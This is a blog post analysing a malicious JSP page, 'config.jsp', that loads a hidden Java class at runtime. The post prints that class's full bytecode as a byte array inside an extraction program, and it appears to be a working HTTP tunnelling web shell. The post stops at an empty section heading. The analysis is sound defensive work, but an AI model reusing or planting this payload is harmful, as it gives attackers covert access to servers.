---
layout: post
title:  "CONFIG.jsp Analysis"
---


The file “config.jsp” is a WEB page. It contains java code, and the payload is unpacked at runtime. The payload also contains java code in binary form which has various capabilities, for instance, HTTP forwarding, randomized headers in HTTP requests, custom base64 encryption for traffic, etc. 

 Refer to Figure 1 for the main code of *CONFIG.JSP* . 

![Figure 1:The main code of Config.jsp ](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/config_jsp/Untitled.png)

Figure 1:The main code of Config.jsp 

---

## Payload extraction

In Figure 2, the bytes array contains a payload. The payload is loaded by the “*ClassLoader*”. 

![Figure 2: Payload in byte array. ](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/config_jsp/Untitled%201.png)

Figure 2: Payload in byte array. 

In Figure 2, the bytes array contains a payload. The payload is loaded by the “*ClassLoader*”  Refer Figure 3.  

```java
Class clazz = new U(this.getClass().getClassLoader()).g(clazzBytes);
application.setAttribute("itlpDIO0ZXYik5t4Ui70lXKciwUYPvmMr",clazz.newInstance());
```

After loading the class, the “*equals*” function is called, and the “*args”* object from figure 1 is passed as a parameter Refer Figure 3. 

```java
application.getAttribute("itlpDIO0ZXYik5t4Ui70lXKciwUYPvmMr").equals(args);
```

![Figure 3: Class loader, and equals function.](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/config_jsp/Untitled%202.png)

Figure 3: Class loader, and equals function.

To extract the payload, this simple java code can be used: 

```java
import java.io.ByteArrayOutputStream;

class Hamad1 {

    public static void PrintByteArray(byte[] arr) {
        for(int i=0; i< arr.length ; i++) {
            System.out.print(String.format("%02X ", arr[i]));
        }
        System.out.print("\n\n");
    }

    public static void main(String[] args) {
        byte[] clazzBytes = new byte[]{-54,-2,-70,-66,0,0,0,49,1,-118,10,0,122,0,-115,7,0,-114,7,0,-113,7,0,-112,7,0,124,9,0,121,0,-111,7,0,126,9,0,121,0,-110,7,0,-109,10,0,9,0,-108,7,0,-107,11,0,3,0,-106,11,0,-105,0,-104,11,0,4,0,-103,11,0,3,0,-102,10,0,121,0,-101,10,0,11,0,-100,10,0,121,0,-99,11,0,4,0,-98,11,0,3,0,-97,7,0,-96,10,0,21,0,-95,10,0,21,0,-94,7,0,-93,10,0,24,0,-92,10,0,24,0,-91,11,0,3,0,-90,10,0,-89,0,-88,10,0,-89,0,-87,11,0,-86,0,-85,11,0,-84,0,-83,11,0,-84,0,-82,10,0,11,0,-81,10,0,121,0,-80,10,0,24,0,-79,11,0,3,0,-78,10,0,24,0,-77,7,0,-76,11,0,4,0,-75,11,0,3,0,-74,10,0,-73,0,-72,10,0,-71,0,-70,10,0,-71,0,-69,10,0,-71,0,-68,10,0,24,0,-67,11,0,-66,0,-65,11,0,-64,0,-85,8,0,-63,8,0,-62,10,0,24,0,-61,10,0,24,0,-60,10,0,24,0,-59,10,0,24,0,-58,11,0,4,0,-57,7,0,-56,10,0,55,0,-115,10,0,-55,0,-72,10,0,-54,0,-53,10,0,55,0,-52,10,0,55,0,-51,10,0,11,0,-50,10,0,9,0,-49,11,0,4,0,-48,10,0,-47,0,-46,10,0,-47,0,-69,11,0,4,0,-45,10,0,11,0,-44,10,0,11,0,-43,10,0,11,0,-42,8,0,-41,10,0,11,0,-40,10,0,9,0,-39,10,0,80,0,-38,7,0,-37,10,0,74,0,-36,10,0,80,0,-35,10,0,80,0,-34,11,0,-33,0,-32,11,0,-33,0,-31,7,0,-30,10,0,80,0,-29,10,0,-28,0,-68,11,0,-33,0,-27,10,0,-26,0,-25,10,0,80,0,-24,10,0,-26,0,-23,10,0,121,0,-22,10,0,-21,0,-20,8,0,-19,10,0,-55,0,-18,7,0,-17,10,0,91,0,-115,10,0,91,0,-16,10,0,91,0,-15,10,0,-26,0,-14,10,0,-26,0,-13,10,0,-26,0,-12,10,0,80,0,-11,7,0,-10,10,0,99,0,-115,10,0,99,0,-9,8,0,-8,10,0,99,0,-7,8,0,-6,10,0,99,0,-15,10,0,11,0,-5,10,0,55,0,-4,10,0,55,0,-3,8,0,-2,10,0,11,0,-1,10,0,21,1,0,10,0,115,1,1,11,1,2,1,3,11,1,2,1,4,7,1,5,10,0,115,1,6,7,1,7,7,1,8,10,0,117,1,9,10,0,11,1,10,7,1,11,7,1,12,1,0,2,101,110,1,0,2,91,67,1,0,2,100,101,1,0,2,91,66,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,6,101,113,117,97,108,115,1,0,21,40,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,41,90,1,0,5,98,54,52,101,110,1,0,22,40,91,66,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,5,98,54,52,100,101,1,0,22,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,91,66,1,0,9,104,101,97,100,101,114,107,101,121,1,0,38,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,10,69,120,99,101,112,116,105,111,110,115,1,0,7,105,115,108,111,99,97,108,1,0,21,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,90,12,0,127,0,-128,1,0,19,91,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,1,0,37,106,97,118,97,120,47,115,101,114,118,108,101,116,47,104,116,116,112,47,72,116,116,112,83,101,114,118,108,101,116,82,101,113,117,101,115,116,1,0,38,106,97,118,97,120,47,115,101,114,118,108,101,116,47,104,116,116,112,47,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101,12,0,123,0,124,12,0,125,0,126,1,0,17,106,97,118,97,47,108,97,110,103,47,73,110,116,101,103,101,114,12,1,13,1,14,1,0,16,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,12,1,15,1,16,7,1,17,12,1,18,1,19,12,1,20,1,21,12,1,22,0,-119,12,0,-122,0,-121,12,0,127,1,23,12,0,-117,0,-116,12,1,24,0,-128,12,1,25,1,26,1,0,12,106,97,118,97,47,110,101,116,47,85,82,76,12,0,127,1,27,12,1,28,1,29,1,0,26,106,97,118,97,47,110,101,116,47,72,116,116,112,85,82,76,67,111,110,110,101,99,116,105,111,110,12,1,30,1,27,12,1,31,1,32,12,1,33,1,34,7,1,35,12,1,36,1,37,12,1,38,1,39,7,1,40,12,1,41,1,42,7,1,43,12,1,44,1,45,12,1,46,1,47,12,1,48,0,-116,12,0,-120,0,-119,12,1,49,1,50,12,1,51,1,14,12,1,52,1,53,1,0,19,106,97,118,97,47,108,97,110,103,47,69,120,99,101,112,116,105,111,110,12,1,54,1,50,12,1,55,1,56,7,1,57,12,1,58,1,59,7,1,60,12,1,61,1,62,12,1,63,0,-128,12,1,64,0,-128,12,1,65,1,66,7,1,67,12,1,68,1,69,7,1,70,1,0,14,67,111,110,116,101,110,116,45,76,101,110,103,116,104,1,0,17,84,114,97,110,115,102,101,114,45,69,110,99,111,100,105,110,103,12,1,71,0,-119,12,1,72,1,14,12,1,55,1,73,12,1,74,1,73,12,1,75,1,76,1,0,29,106,97,118,97,47,105,111,47,66,121,116,101,65,114,114,97,121,79,117,116,112,117,116,83,116,114,101,97,109,7,1,77,7,1,78,12,1,79,1,80,12,1,61,1,23,12,1,81,1,82,12,1,83,1,14,12,1,84,1,85,12,1,86,1,50,7,1,87,12,1,61,1,27,12,1,88,0,-128,12,1,89,1,90,12,1,89,1,85,12,1,91,1,92,1,0,2,92,124,12,1,93,1,94,12,1,95,1,92,12,1,96,1,97,1,0,26,106,97,118,97,47,110,101,116,47,73,110,101,116,83,111,99,107,101,116,65,100,100,114,101,115,115,12,0,127,1,98,12,1,99,1,100,12,1,101,1,102,7,1,103,12,1,104,1,105,12,1,106,1,107,1,0,31,106,97,118,97,47,110,105,111,47,99,104,97,110,110,101,108,115,47,83,111,99,107,101,116,67,104,97,110,110,101,108,12,1,108,1,109,7,1,110,12,1,111,1,27,7,1,112,12,1,113,1,114,12,1,58,1,115,12,1,116,1,82,12,0,-124,0,-123,7,1,117,12,1,118,1,119,1,0,0,12,1,120,1,14,1,0,23,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,105,108,100,101,114,12,1,121,1,122,12,1,84,1,26,12,1,123,1,124,12,1,125,1,119,12,1,126,1,45,12,1,61,1,115,1,0,22,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,102,102,101,114,12,1,121,1,127,1,0,2,61,61,12,1,121,1,-128,1,0,1,61,12,1,-127,1,82,12,0,127,1,76,12,1,61,1,76,1,0,1,45,12,1,-126,1,26,12,1,-125,1,26,12,1,-124,1,34,7,1,-123,12,1,-122,1,45,12,1,-121,1,47,1,0,25,106,97,118,97,47,110,101,116,47,78,101,116,119,111,114,107,73,110,116,101,114,102,97,99,101,12,1,-120,1,34,1,0,20,106,97,118,97,47,110,101,116,47,73,110,101,116,65,100,100,114,101,115,115,1,0,21,106,97,118,97,47,110,101,116,47,73,110,101,116,52,65,100,100,114,101,115,115,12,1,-119,1,26,12,0,-126,0,-125,1,0,10,78,101,111,114,101,71,101,111,114,103,1,0,16,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,1,0,8,105,110,116,86,97,108,117,101,1,0,3,40,41,73,1,0,10,103,101,116,83,101,115,115,105,111,110,1,0,34,40,41,76,106,97,118,97,120,47,115,101,114,118,108,101,116,47,104,116,116,112,47,72,116,116,112,83,101,115,115,105,111,110,59,1,0,30,106,97,118,97,120,47,115,101,114,118,108,101,116,47,104,116,116,112,47,72,116,116,112,83,101,115,115,105,111,110,1,0,17,103,101,116,83,101,114,118,108,101,116,67,111,110,116,101,120,116,1,0,32,40,41,76,106,97,118,97,120,47,115,101,114,118,108,101,116,47,83,101,114,118,108,101,116,67,111,110,116,101,120,116,59,1,0,9,103,101,116,87,114,105,116,101,114,1,0,23,40,41,76,106,97,118,97,47,105,111,47,80,114,105,110,116,87,114,105,116,101,114,59,1,0,9,103,101,116,72,101,97,100,101,114,1,0,5,40,91,66,41,86,1,0,5,114,101,115,101,116,1,0,9,103,101,116,77,101,116,104,111,100,1,0,20,40,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,21,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,86,1,0,14,111,112,101,110,67,111,110,110,101,99,116,105,111,110,1,0,26,40,41,76,106,97,118,97,47,110,101,116,47,85,82,76,67,111,110,110,101,99,116,105,111,110,59,1,0,16,115,101,116,82,101,113,117,101,115,116,77,101,116,104,111,100,1,0,11,115,101,116,68,111,79,117,116,112,117,116,1,0,4,40,90,41,86,1,0,14,103,101,116,72,101,97,100,101,114,78,97,109,101,115,1,0,25,40,41,76,106,97,118,97,47,117,116,105,108,47,69,110,117,109,101,114,97,116,105,111,110,59,1,0,21,106,97,118,97,47,117,116,105,108,47,67,111,108,108,101,99,116,105,111,110,115,1,0,4,108,105,115,116,1,0,46,40,76,106,97,118,97,47,117,116,105,108,47,69,110,117,109,101,114,97,116,105,111,110,59,41,76,106,97,118,97,47,117,116,105,108,47,65,114,114,97,121,76,105,115,116,59,1,0,7,114,101,118,101,114,115,101,1,0,19,40,76,106,97,118,97,47,117,116,105,108,47,76,105,115,116,59,41,86,1,0,14,106,97,118,97,47,117,116,105,108,47,76,105,115,116,1,0,8,105,116,101,114,97,116,111,114,1,0,22,40,41,76,106,97,118,97,47,117,116,105,108,47,73,116,101,114,97,116,111,114,59,1,0,18,106,97,118,97,47,117,116,105,108,47,73,116,101,114,97,116,111,114,1,0,7,104,97,115,78,101,120,116,1,0,3,40,41,90,1,0,4,110,101,120,116,1,0,20,40,41,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,1,0,16,101,113,117,97,108,115,73,103,110,111,114,101,67,97,115,101,1,0,18,115,101,116,82,101,113,117,101,115,116,80,114,111,112,101,114,116,121,1,0,39,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,86,1,0,16,103,101,116,67,111,110,116,101,110,116,76,101,110,103,116,104,1,0,15,103,101,116,79,117,116,112,117,116,83,116,114,101,97,109,1,0,24,40,41,76,106,97,118,97,47,105,111,47,79,117,116,112,117,116,83,116,114,101,97,109,59,1,0,9,115,101,116,72,101,97,100,101,114,1,0,14,103,101,116,73,110,112,117,116,83,116,114,101,97,109,1,0,36,40,41,76,106,97,118,97,120,47,115,101,114,118,108,101,116,47,83,101,114,118,108,101,116,73,110,112,117,116,83,116,114,101,97,109,59,1,0,32,106,97,118,97,120,47,115,101,114,118,108,101,116,47,83,101,114,118,108,101,116,73,110,112,117,116,83,116,114,101,97,109,1,0,4,114,101,97,100,1,0,5,40,91,66,41,73,1,0,20,106,97,118,97,47,105,111,47,79,117,116,112,117,116,83,116,114,101,97,109,1,0,5,119,114,105,116,101,1,0,7,40,91,66,73,73,41,86,1,0,5,102,108,117,115,104,1,0,5,99,108,111,115,101,1,0,15,103,101,116,72,101,97,100,101,114,70,105,101,108,100,115,1,0,17,40,41,76,106,97,118,97,47,117,116,105,108,47,77,97,112,59,1,0,13,106,97,118,97,47,117,116,105,108,47,77,97,112,1,0,6,107,101,121,83,101,116,1,0,17,40,41,76,106,97,118,97,47,117,116,105,108,47,83,101,116,59,1,0,13,106,97,118,97,47,117,116,105,108,47,83,101,116,1,0,14,103,101,116,72,101,97,100,101,114,70,105,101,108,100,1,0,15,103,101,116,82,101,115,112,111,110,115,101,67,111,100,101,1,0,23,40,41,76,106,97,118,97,47,105,111,47,73,110,112,117,116,83,116,114,101,97,109,59,1,0,14,103,101,116,69,114,114,111,114,83,116,114,101,97,109,1,0,9,115,101,116,83,116,97,116,117,115,1,0,4,40,73,41,86,1,0,19,106,97,118,97,47,105,111,47,73,110,112,117,116,83,116,114,101,97,109,1,0,16,106,97,118,97,47,108,97,110,103,47,83,121,115,116,101,109,1,0,9,97,114,114,97,121,99,111,112,121,1,0,42,40,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,73,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,73,73,41,86,1,0,11,116,111,66,121,116,101,65,114,114,97,121,1,0,4,40,41,91,66,1,0,6,108,101,110,103,116,104,1,0,8,116,111,83,116,114,105,110,103,1,0,21,40,73,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,9,97,100,100,72,101,97,100,101,114,1,0,14,106,97,118,97,47,105,111,47,87,114,105,116,101,114,1,0,11,114,101,115,101,116,66,117,102,102,101,114,1,0,9,115,117,98,115,116,114,105,110,103,1,0,22,40,73,73,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,9,99,111,109,112,97,114,101,84,111,1,0,21,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,73,1,0,5,115,112,108,105,116,1,0,39,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,91,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,8,112,97,114,115,101,73,110,116,1,0,4,111,112,101,110,1,0,35,40,41,76,106,97,118,97,47,110,105,111,47,99,104,97,110,110,101,108,115,47,83,111,99,107,101,116,67,104,97,110,110,101,108,59,1,0,22,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,73,41,86,1,0,7,99,111,110,110,101,99,116,1,0,27,40,76,106,97,118,97,47,110,101,116,47,83,111,99,107,101,116,65,100,100,114,101,115,115,59,41,90,1,0,17,99,111,110,102,105,103,117,114,101,66,108,111,99,107,105,110,103,1,0,40,40,90,41,76,106,97,118,97,47,110,105,111,47,99,104,97,110,110,101,108,115,47,83,101,108,101,99,116,97,98,108,101,67,104,97,110,110,101,108,59,1,0,28,106,97,118,97,120,47,115,101,114,118,108,101,116,47,83,101,114,118,108,101,116,67,111,110,116,101,120,116,1,0,12,115,101,116,65,116,116,114,105,98,117,116,101,1,0,39,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,41,86,1,0,12,103,101,116,65,116,116,114,105,98,117,116,101,1,0,38,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,1,0,6,115,111,99,107,101,116,1,0,19,40,41,76,106,97,118,97,47,110,101,116,47,83,111,99,107,101,116,59,1,0,15,106,97,118,97,47,110,101,116,47,83,111,99,107,101,116,1,0,15,114,101,109,111,118,101,65,116,116,114,105,98,117,116,101,1,0,19,106,97,118,97,47,110,105,111,47,66,121,116,101,66,117,102,102,101,114,1,0,8,97,108,108,111,99,97,116,101,1,0,24,40,73,41,76,106,97,118,97,47,110,105,111,47,66,121,116,101,66,117,102,102,101,114,59,1,0,24,40,76,106,97,118,97,47,110,105,111,47,66,121,116,101,66,117,102,102,101,114,59,41,73,1,0,5,97,114,114,97,121,1,0,15,106,97,118,97,47,110,105,111,47,66,117,102,102,101,114,1,0,5,99,108,101,97,114,1,0,19,40,41,76,106,97,118,97,47,110,105,111,47,66,117,102,102,101,114,59,1,0,9,97,118,97,105,108,97,98,108,101,1,0,6,97,112,112,101,110,100,1,0,45,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,105,108,100,101,114,59,1,0,3,112,117,116,1,0,25,40,91,66,41,76,106,97,118,97,47,110,105,111,47,66,121,116,101,66,117,102,102,101,114,59,1,0,4,102,108,105,112,1,0,12,104,97,115,82,101,109,97,105,110,105,110,103,1,0,27,40,67,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,102,102,101,114,59,1,0,44,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,102,102,101,114,59,1,0,8,103,101,116,66,121,116,101,115,1,0,11,116,111,85,112,112,101,114,67,97,115,101,1,0,7,103,101,116,72,111,115,116,1,0,20,103,101,116,78,101,116,119,111,114,107,73,110,116,101,114,102,97,99,101,115,1,0,21,106,97,118,97,47,117,116,105,108,47,69,110,117,109,101,114,97,116,105,111,110,1,0,15,104,97,115,77,111,114,101,69,108,101,109,101,110,116,115,1,0,11,110,101,120,116,69,108,101,109,101,110,116,1,0,16,103,101,116,73,110,101,116,65,100,100,114,101,115,115,101,115,1,0,14,103,101,116,72,111,115,116,65,100,100,114,101,115,115,0,33,0,121,0,122,0,0,0,2,0,2,0,123,0,124,0,0,0,2,0,125,0,126,0,0,0,6,0,1,0,127,0,-128,0,1,0,-127,0,0,0,17,0,1,0,1,0,0,0,5,42,-73,0,1,-79,0,0,0,0,0,1,0,-126,0,-125,0,1,0,-127,0,0,5,-60,0,5,0,40,0,0,5,112,43,-64,0,2,-64,0,2,77,44,3,50,-64,0,3,78,44,4,50,-64,0,4,58,4,42,44,5,50,-64,0,5,-64,0,5,-75,0,6,42,44,6,50,-64,0,7,-64,0,7,-75,0,8,44,7,50,-64,0,9,-74,0,10,54,5,44,8,50,-64,0,9,-74,0,10,54,6,44,16,6,50,-64,0,9,-74,0,10,54,7,44,16,7,50,-64,0,11,58,8,44,16,8,50,-64,0,11,58,9,44,16,9,50,-64,0,11,58,10,44,16,10,50,-64,0,11,58,11,44,16,11,50,-64,0,11,58,12,44,16,12,50,-64,0,11,58,13,44,16,13,50,-64,0,11,58,14,44,16,14,50,-64,0,11,58,15,44,16,15,50,-64,0,11,58,16,44,16,16,50,-64,0,11,58,17,44,16,17,50,-64,0,11,58,18,44,16,18,50,-64,0,11,58,19,44,16,19,50,-64,0,11,58,20,44,16,20,50,-64,0,11,58,21,44,16,21,50,-64,0,11,58,22,44,16,22,50,-64,0,11,58,23,44,16,23,50,-64,0,11,58,24,44,16,24,50,-64,0,11,58,25,44,16,25,50,-64,0,11,58,26,45,-71,0,12,1,0,-71,0,13,1,0,58,27,25,4,-71,0,14,1,0,58,28,45,25,12,-71,0,15,2,0,58,29,25,29,-58,1,-25,-69,0,11,89,42,25,29,-74,0,16,-73,0,17,58,29,42,25,29,-74,0,18,-102,1,-49,25,4,-71,0,19,1,0,45,-71,0,20,1,0,58,30,-69,0,21,89,25,29,-73,0,22,58,31,25,31,-74,0,23,-64,0,24,58,32,25,32,25,30,-74,0,25,25,32,4,-74,0,26,45,-71,0,27,1,0,58,33,25,33,-72,0,28,58,34,25,34,-72,0,29,25,34,-71,0,30,1,0,58,35,25,35,-71,0,31,1,0,-103,0,50,25,35,-71,0,32,1,0,-64,0,11,58,36,25,36,25,12,-74,0,33,-102,0,25,45,25,36,-71,0,15,2,0,58,37,25,32,25,36,-72,0,34,25,37,-74,0,35,-89,-1,-54,17,4,0,-68,8,58,36,45,-71,0,36,1,0,2,-97,0,73,25,32,-74,0,37,58,37,-89,0,18,58,38,25,4,25,9,25,26,-71,0,39,3,0,3,-84,45,-71,0,40,1,0,58,38,25,38,25,36,-74,0,41,89,54,35,2,-97,0,16,25,37,25,36,3,21,35,-74,0,42,-89,-1,-24,25,37,-74,0,43,25,37,-74,0,44,25,32,-74,0,45,-71,0,46,1,0,-71,0,47,1,0,58,37,25,37,-71,0,31,1,0,-103,0,63,25,37,-71,0,32,1,0,-64,0,11,58,38,25,38,-58,0,43,25,38,18,48,-74,0,33,-102,0,33,25,38,18,49,-74,0,33,-102,0,23,25,32,25,38,-74,0,50,58,39,25,4,25,38,25,39,-71,0,39,3,0,-89,-1,-67,25,32,-74,0,51,17,1,-112,-94,0,13,25,32,-74,0,52,58,37,-89,0,26,25,32,-74,0,53,58,37,25,37,-57,0,14,25,4,21,5,-71,0,54,2,0,3,-84,-69,0,55,89,-73,0,56,58,38,25,37,25,36,-74,0,57,89,54,35,2,-97,0,30,21,35,-68,8,58,39,25,36,3,25,39,3,21,35,-72,0,58,25,38,25,39,-74,0,59,-89,-1,-38,-69,0,11,89,25,38,-74,0,60,-73,0,17,58,39,25,4,18,48,25,39,-74,0,61,-72,0,62,-71,0,63,3,0,25,4,25,32,-74,0,51,-71,0,54,2,0,25,28,25,39,-74,0,64,25,28,-74,0,65,3,-84,25,4,-71,0,66,1,0,25,4,21,5,-71,0,54,2,0,45,25,10,-71,0,15,2,0,58,30,25,30,-58,2,64,25,30,3,16,22,-74,0,67,58,31,25,30,16,22,-74,0,68,58,30,25,4,25,8,25,17,-71,0,39,3,0,25,30,25,19,-74,0,69,-102,0,125,-69,0,11,89,42,45,25,11,-71,0,15,2,0,-74,0,16,-73,0,17,18,70,-74,0,71,58,32,25,32,3,50,58,33,25,32,4,50,-72,0,72,54,34,-72,0,73,58,35,25,35,-69,0,74,89,25,33,21,34,-73,0,75,-74,0,76,87,25,35,3,-74,0,77,87,25,27,25,31,25,35,-71,0,78,3,0,25,4,25,8,25,17,-71,0,39,3,0,-89,1,-74,58,32,25,4,25,9,25,16,-71,0,39,3,0,25,4,25,8,25,13,-71,0,39,3,0,-89,1,-101,25,30,25,20,-74,0,69,-102,0,42,25,27,25,31,-71,0,79,2,0,-64,0,80,58,32,25,32,-74,0,81,-74,0,82,-89,0,5,58,33,25,27,25,31,-71,0,83,2,0,-89,1,106,25,30,25,21,-74,0,69,-102,0,-103,25,27,25,31,-71,0,79,2,0,-64,0,80,58,32,21,6,-72,0,84,58,33,25,32,25,33,-74,0,85,54,34,21,7,54,35,3,54,36,21,34,-98,0,81,21,34,-68,8,58,37,25,33,-74,0,86,3,25,37,3,21,34,-72,0,58,25,28,42,25,37,-74,0,87,-74,0,64,25,28,-74,0,65,25,33,-74,0,88,87,21,36,21,34,96,54,36,21,34,21,6,-95,0,25,21,36,21,35,-95,0,6,-89,0,15,25,32,25,33,-74,0,85,54,34,-89,-1,-80,25,4,25,8,25,17,-71,0,39,3,0,-89,0,16,58,33,25,4,25,8,25,13,-71,0,39,3,0,-89,0,-54,25,30,25,22,-74,0,69,-102,0,-64,25,27,25,31,-71,0,79,2,0,-64,0,80,58,32,18,89,58,33,45,-71,0,40,1,0,58,34,25,34,-74,0,90,54,35,21,35,2,-96,0,6,-89,0,55,21,35,-68,8,58,36,25,34,25,36,-74,0,57,2,-96,0,6,-89,0,35,-69,0,91,89,-73,0,92,25,33,-74,0,93,-69,0,11,89,25,36,-73,0,17,-74,0,93,-74,0,94,58,33,-89,-1,-65,42,25,33,-74,0,16,58,35,25,35,-66,-72,0,84,58,36,25,36,25,35,-74,0,95,87,25,36,-74,0,96,87,25,36,-74,0,97,-103,0,14,25,32,25,36,-74,0,98,87,-89,-1,-16,25,4,25,8,25,17,-71,0,39,3,0,-89,0,35,58,33,25,4,25,9,25,25,-71,0,39,3,0,25,4,25,8,25,13,-71,0,39,3,0,25,32,-74,0,81,-74,0,82,-89,0,10,25,28,25,14,-74,0,64,-89,0,4,77,3,-84,0,9,1,-45,1,-38,1,-35,0,38,3,78,3,-86,3,-83,0,38,3,-32,3,-24,3,-21,0,38,4,17,4,-122,4,-119,0,38,4,-79,5,61,5,64,0,38,0,0,1,-21,5,109,0,38,1,-20,2,-101,5,109,0,38,2,-100,3,6,5,109,0,38,3,7,5,106,5,109,0,38,0,0,0,1,0,-124,0,-123,0,1,0,-127,0,0,1,22,0,5,0,8,0,0,1,10,-69,0,99,89,-73,0,100,77,43,-66,62,3,54,4,21,4,29,-94,0,-12,43,21,4,-124,4,1,51,17,0,-1,126,54,5,21,4,29,-96,0,43,44,42,-76,0,6,21,5,5,124,52,-74,0,101,87,44,42,-76,0,6,21,5,6,126,7,120,52,-74,0,101,87,44,18,102,-74,0,103,87,-89,0,-71,43,21,4,-124,4,1,51,17,0,-1,126,54,6,21,4,29,-96,0,69,44,42,-76,0,6,21,5,5,124,52,-74,0,101,87,44,42,-76,0,6,21,5,6,126,7,120,21,6,17,0,-16,126,7,124,-128,52,-74,0,101,87,44,42,-76,0,6,21,6,16,15,126,5,120,52,-74,0,101,87,44,18,104,-74,0,103,87,-89,0,100,43,21,4,-124,4,1,51,17,0,-1,126,54,7,44,42,-76,0,6,21,5,5,124,52,-74,0,101,87,44,42,-76,0,6,21,5,6,126,7,120,21,6,17,0,-16,126,7,124,-128,52,-74,0,101,87,44,42,-76,0,6,21,6,16,15,126,5,120,21,7,17,0,-64,126,16,6,124,-128,52,-74,0,101,87,44,42,-76,0,6,21,7,16,63,126,52,-74,0,101,87,-89,-1,12,44,-74,0,105,-80,0,0,0,0,0,1,0,-122,0,-121,0,1,0,-127,0,0,1,18,0,4,0,10,0,0,1,6,43,-74,0,106,77,44,-66,62,-69,0,55,89,29,-73,0,107,58,4,3,54,5,21,5,29,-94,0,-24,42,-76,0,8,44,21,5,-124,5,1,51,51,54,6,21,5,29,-94,0,9,21,6,2,-97,-1,-23,21,6,2,-96,0,6,-89,0,-59,42,-76,0,8,44,21,5,-124,5,1,51,51,54,7,21,5,29,-94,0,9,21,7,2,-97,-1,-23,21,7,2,-96,0,6,-89,0,-94,25,4,21,6,5,120,21,7,16,48,126,7,124,-128,-74,0,108,44,21,5,-124,5,1,51,54,8,21,8,16,61,-96,0,9,25,4,-74,0,60,-80,42,-76,0,8,21,8,51,54,8,21,5,29,-94,0,9,21,8,2,-97,-1,-40,21,8,2,-96,0,6,-89,0,93,25,4,21,7,16,15,126,7,120,21,8,16,60,126,5,124,-128,-74,0,108,44,21,5,-124,5,1,51,54,9,21,9,16,61,-96,0,9,25,4,-74,0,60,-80,42,-76,0,8,21,9,51,54,9,21,5,29,-94,0,9,21,9,2,-97,-1,-40,21,9,2,-96,0,6,-89,0,21,25,4,21,8,6,126,16,6,120,21,9,-128,-74,0,108,-89,-1,24,25,4,-74,0,60,-80,0,0,0,0,0,8,0,-120,0,-119,0,2,0,-127,0,0,0,115,0,4,0,6,0,0,0,103,18,89,76,42,18,109,-74,0,71,77,44,-66,62,3,54,4,21,4,29,-94,0,72,44,21,4,50,58,5,-69,0,91,89,-73,0,92,43,-74,0,93,25,5,3,4,-74,0,67,-74,0,110,-74,0,93,25,5,4,-74,0,68,-74,0,93,-74,0,94,76,-69,0,91,89,-73,0,92,43,-74,0,93,18,109,-74,0,93,-74,0,94,76,-124,4,1,-89,-1,-72,43,3,43,-74,0,61,4,100,-74,0,67,-80,0,0,0,0,0,-118,0,0,0,4,0,1,0,38,0,0,0,-117,0,-116,0,2,0,-127,0,0,0,107,0,3,0,7,0,0,0,95,-69,0,21,89,43,-73,0,22,-74,0,111,77,-72,0,112,78,45,-71,0,113,1,0,-103,0,71,45,-71,0,114,1,0,-64,0,115,58,4,25,4,-74,0,116,58,5,25,5,-71,0,113,1,0,-103,0,40,25,5,-71,0,114,1,0,-64,0,117,58,6,25,6,-63,0,118,-103,0,17,25,6,-74,0,119,44,-74,0,120,-103,0,5,4,-84,-89,-1,-44,-89,-1,-74,3,-84,0,0,0,0,0,-118,0,0,0,4,0,1,0,38,0,0};

        PrintByteArray(clazzBytes);

    }

}
```

Running the java code will print the payload bytes. The first 4 bytes of the payload `CA FE BA BE` represents the magic number. This magic number is used for java *.class* files. The payload can be decompiled with JADX decompiler. Refer Figure 4, 5.

![Figure 4: Payload printed in hex. ](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/config_jsp/Untitled%203.png)

Figure 4: Payload printed in hex. 

![Figure 5: Decompiled code of the payload by JADX decompiler.](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/config_jsp/Untitled%204.png)

Figure 5: Decompiled code of the payload by JADX decompiler.

## The functionality of the payload

